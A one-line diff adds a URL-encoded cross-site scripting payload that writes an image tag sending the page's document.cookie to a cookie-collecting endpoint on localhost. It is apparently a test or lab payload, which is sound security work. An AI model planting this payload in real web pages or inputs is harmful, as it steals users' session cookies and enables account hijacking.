@@ -1,0 +1,1 @@
+%3cscript>document.write('%3cimg src="http://localhost:49834/WriteCookie.aspx?Cookie='%2bdocument.cookie%2b'">');%3c/script>
